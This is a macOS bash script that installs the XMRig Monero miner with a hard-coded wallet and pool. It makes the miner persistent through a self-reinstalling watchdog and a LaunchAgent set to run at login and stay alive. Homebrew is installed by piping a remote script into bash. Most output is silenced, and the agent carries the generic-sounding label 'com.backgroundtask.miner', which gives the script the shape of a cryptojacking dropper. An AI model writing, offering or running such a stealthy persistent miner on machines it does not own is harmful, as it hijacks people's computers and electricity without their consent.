#!/usr/bin/env bash
set -euo pipefail

WALLET="464WoeWykbHMGTpkr6otNu4RhjHnt3L9KL16cBPjbGs7hvWvTT7C2oWHidAvFpbeuTPhkQ1Vtk1tC6VzsZA5dUP91mYKKPF"
POOL="pool.moneroocean.stream:10001"
WORKER="mac_miner"
LOGDIR="$HOME/Library/Logs"
LOGFILE="$LOGDIR/miner.log"
PLIST="$HOME/Library/LaunchAgents/com.backgroundtask.miner.plist"
WATCHDOG="$HOME/xmrig_watchdog.sh"

# install Homebrew if not present
if ! command -v brew >/dev/null 2>&1; then
  /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" </dev/null >/dev/null 2>&1
fi

# ensure log directory exists
mkdir -p "$LOGDIR"

# watchdog script
cat > "$WATCHDOG" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail

# Ensure Homebrew path is available
export PATH="/opt/homebrew/bin:/usr/local/bin:$PATH"

WALLET="464WoeWykbHMGTpkr6otNu4RhjHnt3L9KL16cBPjbGs7hvWvTT7C2oWHidAvFpbeuTPhkQ1Vtk1tC6VzsZA5dUP91mYKKPF"
POOL="pool.moneroocean.stream:10001"
WORKER="mac_miner"
LOGDIR="$HOME/Library/Logs"
LOGFILE="$LOGDIR/miner.log"
PIDFILE="$HOME/.xmrig.pid"

mkdir -p "$LOGDIR"

while true; do
  # reinstall xmrig if missing
  if ! command -v xmrig >/dev/null 2>&1; then
    brew install xmrig >/dev/null 2>&1 || true
  fi

  # reinstall cpulimit if missing
  if ! command -v cpulimit >/dev/null 2>&1; then
    brew install cpulimit >/dev/null 2>&1 || true
  fi

  # delete log if too large (>50MB)
  if [ -f "$LOGFILE" ] && [ $(du -m "$LOGFILE" | cut -f1) -gt 50 ]; then
    mv "$LOGFILE" "$LOGFILE.$(date +%Y%m%d-%H%M%S).old"
  fi

  # check if xmrig already running
  if [ -f "$PIDFILE" ]; then
    PID=$(cat "$PIDFILE" || true)
    if [ -n "$PID" ] && ps -p "$PID" -o comm= | grep -q "^xmrig$"; then
      sleep 10
      continue
    else
      rm -f "$PIDFILE"
    fi
  fi

  # run xmrig capped at 50% CPU, log to file
  nohup cpulimit -l 50 xmrig \
    --url=$POOL \
    --user=$WALLET \
    --pass=$WORKER \
    --donate-level=1 \
    --log-file=$LOGFILE \
    >> "$LOGFILE" 2>&1 &
  echo $! > "$PIDFILE"

  # wait for miner to exit
  wait $(cat "$PIDFILE") || true
  rm -f "$PIDFILE"

  # sleep briefly before restart
  sleep 5
done
EOF
chmod +x "$WATCHDOG"

# create LaunchAgent plist
mkdir -p "$HOME/Library/LaunchAgents"
cat > "$PLIST" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
 "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.backgroundtask.miner</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>$WATCHDOG</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>$LOGFILE</string>
    <key>StandardErrorPath</key>
    <string>$LOGFILE</string>
</dict>
</plist>
EOF

# load LaunchAgent immediately
launchctl unload "$PLIST" >/dev/null 2>&1 || true
launchctl load "$PLIST" >/dev/null 2>&1 || true
